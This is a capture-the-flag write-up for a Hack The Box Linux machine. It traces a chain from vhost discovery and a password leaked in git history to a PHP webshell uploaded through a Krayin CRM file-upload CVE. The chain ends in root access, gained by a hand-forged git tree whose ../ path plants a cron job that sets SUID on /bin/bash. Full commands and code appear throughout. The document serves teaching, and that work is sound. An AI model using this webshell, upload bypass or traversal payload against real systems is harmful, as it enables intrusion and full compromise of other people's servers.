# HTB: Nexus — Writeup

**Difficulty:** Hard (multi-stage: web recon → vhost enum → OSINT → CVE RCE → systemd-timer privesc)
**OS:** Linux

## Recon

```bash
ping -c 3 <TARGET_IP>          # confirm VPN connectivity/reachability
nmap -sC -sV -p- <TARGET_IP>
```

Results:
```
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

Port 80 redirects to a hostname, not the IP — the browser can't resolve `nexus.htb` on its own. Fix:

```bash
echo "10.129.234.54 nexus.htb" | sudo tee -a /etc/hosts
```

## Subdomain enumeration

Installed tools:
```bash
brew install gobuster
git clone --depth 1 https://github.com/danielmiessler/SecLists.git ~/tools/SecLists
```

Vhost brute-force:
```bash
gobuster vhost -u http://nexus.htb \
  -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

Found:
```
git.nexus.htb     Status: 200
billing.nexus.htb Status: 302 → /admin/login
```

Added both to `/etc/hosts`.

`billing.nexus.htb` redirected to `/admin/login` and its cookies (`krayin_crm_session`) identified it as **Krayin CRM**.

## Gitea enumeration — public repo discovery

Gitea (`git.nexus.htb`) exposed an unauthenticated REST API. Listed public repos:

```bash
curl -s "http://git.nexus.htb/api/v1/repos/search"
```

Found a public, pullable repo: `admin/krayin-docker-setup`. Cloned it:

```bash
git clone http://git.nexus.htb/admin/krayin-docker-setup.git
```

Contents: `docker-compose.yml` and `.env` (with `APP_URL=http://billing.nexus.htb`, confirming this was the live deployment's config).

## Credential hunting in git history

The latest `.env` commit had a **blank** `DB_PASSWORD`, but checking full history revealed an earlier commit with the real value:

```bash
git log -p --all
```

```diff
- DB_PASSWORD=N27xh!!2ucY04
+ DB_PASSWORD=
```

**Lesson:** secrets removed in a later commit are still recoverable from git history unless the repo is rewritten (`git filter-repo`/BFG) — a very common real-world leak.

This DB password alone did not work as the Krayin admin login.

## OSINT — finding a real username

A careers/job-listing page on the site leaked a real staff email in first-initial.lastname format:

```
Apply at careers@nexus.htb
Hiring manager: j.matthew@nexus.htb
```

## Foothold — Krayin CRM admin login

Combined the OSINT username with the DB password found in git history (again, password reuse):

```
email: j.matthew@nexus.htb
password: N27xh!!2ucY04
```

This logged into the Krayin admin panel at `http://billing.nexus.htb/admin/login`.

## Version fingerprinting

Krayin runs on Laravel with `APP_DEBUG=true`, so hitting an invalid route (e.g. a GET on a POST-only endpoint) rendered a full **Laravel Ignition** debug page, leaking:

```
PHP Version: 8.3.6
Laravel Version: 12.54.1
```

Combined with the CVE research below, the running app was identified as **Krayin CRM v2.2.x**.

## CVE-2026-38526 — Authenticated RCE via TinyMCE upload

Researched the version against known CVEs:

- **CVE-2026-38526** — Webkul Krayin CRM v2.2.x, CVSS 9.9. Unrestricted file upload (CWE-434) at `/admin/tinymce/upload`: the endpoint doesn't validate real file content, only trusts client-supplied metadata.

### Finding the real request shape

Used the Krayin admin panel's own feature (Settings → Email Templates → edit → insert image via the TinyMCE toolbar) and captured the real upload request in browser DevTools (Network tab → right-click → Copy as cURL). This revealed the multipart form fields:

```
_token: <CSRF token>
file:   <binary>
```

### Exploiting it

Uploaded a PHP webshell instead of an image, spoofing the MIME type in the multipart header:

```php
<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>
```

```bash
curl -i "http://billing.nexus.htb/admin/tinymce/upload" \
  -H "Cookie: XSRF-TOKEN=<...>; krayin_crm_session=<...>" \
  -F "_token=<csrf_token>" \
  -F "file=@shell.php;type=image/jpeg"
```

Response confirmed the file was saved with its `.php` extension intact:
```json
{"location":"http://billing.nexus.htb/storage/tinymce/a03515a65e8f935bfa360700f9386680.php"}
```

Triggered it:
```bash
curl -s "http://billing.nexus.htb/storage/tinymce/a03515a65e8f935bfa360700f9386680.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data`.

## Post-exploitation — finding jones' password

Confirmed `jones` was a real system account:
```bash
cat /etc/passwd   # jones:x:1000:1000:,,,:/home/jones:/bin/bash
```

Read Krayin's live, deployed `.env` (different path/password than the git-leaked template):
```bash
cat /var/www/krayin/.env
# DB_PASSWORD=y27xb3ha!!74GbR
```

Password reuse again — this worked for SSH as `jones`:
```bash
ssh jones@<TARGET_IP>
# password: y27xb3ha!!74GbR
```

Same credential also worked for Gitea login as `jones`.

## Privilege escalation — systemd timer + Gitea template sync

Enumerated scheduled jobs:
```bash
systemctl list-timers --all
```

Found a custom, frequently-firing (~60s) timer:
```
gitea-template-sync.timer → gitea-template-sync.service
```

Inspected the service:
```bash
systemctl cat gitea-template-sync.service
```
```ini
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
```

**Runs as root.** Read the script:
```bash
cat /etc/gitea/template-sync.py
```

Logic: queries Gitea for repos marked as "template" repos, then for each file in the repo's git tree, writes it to disk at:
```python
target = os.path.join(STAGING_DIR, owner, name, filepath)
# STAGING_DIR = /home/git/template-staging
```

**Vulnerability:** `filepath` comes straight from `git ls-tree` output with zero sanitization. If a git tree entry contains a path with `../`, the write escapes the staging directory — arbitrary file write as root.

### Building the path-traversal payload

Modern `git` (client-side `mktree`/`hash-object`) refuses to create tree objects with `../` in paths (fsck protection). Bypassed by constructing the raw git tree object by hand and writing it directly into `.git/objects/`, skipping git's own validation:

```bash
mkdir /tmp/pwnrepo && cd /tmp/pwnrepo
git init
git config user.email "jones@nexus.htb"
git config user.name "jones"

printf '* * * * * root chmod u+s /bin/bash\n' > payload
BLOB=$(git hash-object -w payload)

python3 -c "
import sys
mode = b'100644'
path = b'../../../../../etc/cron.d/pwn'
sha_raw = bytes.fromhex('$BLOB')
sys.stdout.buffer.write(mode + b' ' + path + b'\x00' + sha_raw)
" > /tmp/tree_raw.bin

python3 -c "
import hashlib, zlib, os
content = open('/tmp/tree_raw.bin','rb').read()
store = b'tree ' + str(len(content)).encode() + b'\x00' + content
sha1 = hashlib.sha1(store).hexdigest()
os.makedirs(f'.git/objects/{sha1[:2]}', exist_ok=True)
open(f'.git/objects/{sha1[:2]}/{sha1[2:]}','wb').write(zlib.compress(store))
print('Tree SHA:', sha1)
"
```

**Traversal depth calculation:** target write path is
```
/home/git/template-staging/<owner>/<repo>/<filepath>
```
which is 5 directory levels deep from `/`, requiring exactly `../../../../../` to reach root before appending the real target (`etc/cron.d/pwn`).

Committed and pushed the crafted tree:
```bash
TREE=<sha_from_above>
COMMIT=$(git commit-tree "$TREE" -m "init")
git update-ref refs/heads/main "$COMMIT"

setopt no_bang_hist   # zsh: needed because password contains '!'
git remote add origin "http://jones:y27xb3ha!!74GbR@git.nexus.htb/jones/test.git"
git push -u origin main --force
```

In the Gitea web UI: `jones/test` repo → **Settings → Template Repository** → enabled.

### Trigger and confirm

Waited ~60s for `gitea-template-sync.timer`. Verified the write escaped the staging directory:
```bash
cat /etc/cron.d/pwn
# * * * * * root chmod u+s /bin/bash
```

Waited for the next cron minute, then:
```bash
bash -p
id
# uid=1000(jones) gid=1000(jones) euid=0(root) groups=1000(jones),100(users)
```

Root achieved via `bash -p` (effective UID 0 because `/bin/bash` now has the SUID bit, and `-p` tells bash not to drop the elevated privilege).

## Summary of the chain

1. Full port scan → nginx redirecting to `nexus.htb`, add to `/etc/hosts`
2. `gobuster vhost` → discovered `git.nexus.htb` (Gitea) and `billing.nexus.htb` (Krayin CRM)
3. Gitea's unauthenticated API → found public repo `admin/krayin-docker-setup`
4. `git log -p --all` on that repo → recovered a DB password deleted from the latest commit
5. Careers page on the main site → leaked staff email format, gave `j.matthew@nexus.htb`
6. Combined email + git-leaked password → logged into Krayin admin panel
7. `APP_DEBUG=true` Laravel Ignition error page → fingerprinted PHP/Laravel versions → identified Krayin v2.2.x
8. Matched version to CVE-2026-38526 (unauthenticated-file-type-check bypass on `/admin/tinymce/upload`)
9. Captured the real upload request via browser DevTools, replayed it with a PHP webshell instead of an image → RCE as `www-data`
10. Enumerated `/etc/passwd` → confirmed `jones` as a real user
11. Read the live `.env` → found the real DB password → reused for SSH and Gitea as `jones`
12. `systemctl list-timers` → found `gitea-template-sync.timer` running a root-owned Python script every ~60s
13. Read the script → found an unsanitized path-traversal file-write vulnerability tied to Gitea "template" repos
14. Manually crafted a git tree object (bypassing git's client-side path validation) to smuggle a `../` traversal path into a template repo
15. Marked the repo as a Gitea template → timer fired → script wrote a root cron job outside its intended directory
16. Cron job set SUID on `/bin/bash` → `bash -p` → root

## Lessons for teaching

- **vhost enumeration matters**: `gobuster vhost` found two subdomains a plain port scan never would have.
- **Git history never truly "removes" a secret** — always assume anything ever committed is retrievable unless the repo was rewritten and force-pushed/GC'd.
- **OSINT from a normal marketing/careers page** can hand you a real username format — always check "About"/careers pages during recon.
- **`APP_DEBUG=true` in production is a real, common misconfiguration** that leaks full stack traces, versions, and file paths — a reliable fingerprinting method when present.
- **Password reuse across FTP/SSH/CRM/Gitea** was the connective tissue of the entire chain — this is extremely realistic; humans reuse passwords across services constantly.
- **CVE hunting workflow**: version fingerprint → search "\<product\> \<version\> CVE" → check for public PoCs before building your own from scratch, but understanding the underlying bug class (unrestricted file upload, CWE-434) matters more than the PoC script itself.
- **Blind trust in data from a "trusted" internal source (git tree entries) is dangerous** — `template-sync.py`'s core bug is treating filenames pulled from a repository as safe without validating them, a classic path traversal / unsanitized input pattern applicable far beyond git.
- **systemd timers are the modern cron** — `systemctl list-timers --all` should be a standard step in any Linux privesc enumeration checklist, not just `crontab -l` and `/etc/cron.d`.
